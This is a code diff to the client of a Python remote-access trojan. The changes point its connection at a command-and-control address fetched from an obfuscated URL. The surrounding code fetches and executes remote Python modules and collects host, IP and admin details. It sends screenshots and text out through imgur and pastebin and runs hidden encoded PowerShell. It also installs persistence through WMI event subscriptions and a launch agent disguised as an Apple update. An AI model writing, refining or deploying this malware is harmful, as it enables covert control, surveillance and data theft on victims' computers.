@@ -48,6 +48,7 @@ import sys
 import time
 import json
 import socket
+import requests
 import threading
 import subprocess
 from mss import mss
@@ -58,7 +59,6 @@ from random import choice
 from platform import uname
 from imp import new_module
 from zipfile import ZipFile
-from requests import request
 from logging import getLogger
 from urllib import urlretrieve
 from Crypto.Cipher import AES
@@ -334,7 +334,7 @@ class Client(object):
 
     def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
 
-    def _get_info(self): return {k:v for k,v in zip(['Platform', 'Machine', 'Version','Release', 'Family', 'Processor', 'IP Address','Login', 'Admin', 'MAC Address'], [i for i in uname()] + [request('GET', 'http://api.ipify.org').content, socket.gethostbyname(socket.gethostname()), bool(os.getuid() == 0 if os.name is 'posix' else windll.shell32.IsUserAnAdmin()), '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2))])}
+    def _get_info(self): return {k:v for k,v in zip(['Platform', 'Machine', 'Version','Release', 'Family', 'Processor', 'IP Address','Login', 'Admin', 'MAC Address'], [i for i in uname()] + [requests.get('http://api.ipify.org').content, socket.gethostbyname(socket.gethostname()), bool(os.getuid() == 0 if os.name is 'posix' else windll.shell32.IsUserAnAdmin()), '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2))])}
 
     def _get(self, target): return getattr(self, target)() if target in ['jobs','results','options','status','commands','modules','info'] else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
   
@@ -398,25 +398,30 @@ class Client(object):
 
     def _target(self):
         try:
-            ab = request('GET', long_to_bytes(long(self.__a__)), headers={'API-Key': long_to_bytes(long(self.__b__))}).json()
-            if self.__v__:
-                print ab[ab.keys()[0]][0].get('ip')
-            return ab[ab.keys()[0]][0].get('ip')
+            ab = requests.get(long_to_bytes(long(self.__a__)), headers={'API-Key': long_to_bytes(long(self.__b__))}).json()
+            cd = ab[ab.keys()[0]][0].get('ip')
+            if requests.utils.is_ipv4_address(cd):
+                return cd
+            else:
+                if self.__v__:
+                    print 'Target error: invalid response from server'
+            time.sleep(10)
+            return self._target()
         except Exception as e:
             if self.__v__:
                 print 'Target error: {}'.format(str(e))
     
     def _connect(self, port=1337):
+        h = self._target()
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            __host__ = 'localhost'
-            s.connect((__host__, port))
+            s.connect((h, port))
             return s
         except Exception as e:
             if self.__v__:
                 print 'Connection error: {}'.format(str(e))
-            time.sleep(10)
-            return self._connect(__host__, port)
+        time.sleep(10)
+        return self._connect(h, port)
 
     def _send(self, data, method='default'):
         try:
@@ -622,7 +627,7 @@ class Client(object):
         sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
         for target in sources:
             try:
-                ip = request('GET', target).content
+                ip = requests.get(target).content
                 if socket.inet_aton(ip):
                     return ip
             except: pass
@@ -656,7 +661,7 @@ class Client(object):
         try:
             name    = os.path.splitext(os.path.basename(uri))[0] if 'name' not in kwargs else str(kwargs.get('name'))
             module  = new_module(name)
-            source  = request('GET', uri).content
+            source  = requests.get(uri).content
             code    = compile(source, name, 'exec')
             exec code in module.__dict__
             self._modules[name] = module
@@ -690,11 +695,11 @@ class Client(object):
         with open(filename, 'rb') as fp:
             data = b64encode(fp.read())
         os.remove(filename)
-        result = request('POST', 'https://api.imgur.com/3/upload', headers={'Authorization': long_to_bytes(long(self.__e__))}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
+        result = requests.post('https://api.imgur.com/3/upload', headers={'Authorization': long_to_bytes(long(self.__e__))}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
         return result
 
     def _pastebin(self, text):
-        result = request('POST', 'https://pastebin.com/api/api_post.php', data={'api_dev_key': long_to_bytes(long(self.__c__)), 'api_user_key': long_to_bytes(long(self.__d__)), 'api_option': 'paste', 'api_paste_code': text}).content
+        result = requests.post('https://pastebin.com/api/api_post.php', data={'api_dev_key': long_to_bytes(long(self.__c__)), 'api_user_key': long_to_bytes(long(self.__d__)), 'api_option': 'paste', 'api_paste_code': text}).content
         return result
     
     def _ftp(self, filepath):
@@ -1075,7 +1080,7 @@ class Client(object):
             elif command:
                 cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
             startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-            powershell = request('GET', long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
+            powershell = requests.get(long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
             self._powershell(powershell)
             code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
             result = self._powershell(code)
@@ -1129,7 +1134,7 @@ class Client(object):
     def _persistence_add_launch_agent(self, name='com.apple.update.manager'):
         if hasattr(self, '__f__'):
             try:
-                code    = request('GET', long_to_bytes(self.__g__)).content
+                code    = requests.get(long_to_bytes(self.__g__)).content
                 label   = name
                 fpath   = mktemp(suffix='.sh')
                 bash    = code.replace('__LABEL__', label).replace('__FILE__', long_to_bytes(long(self.__f__)))
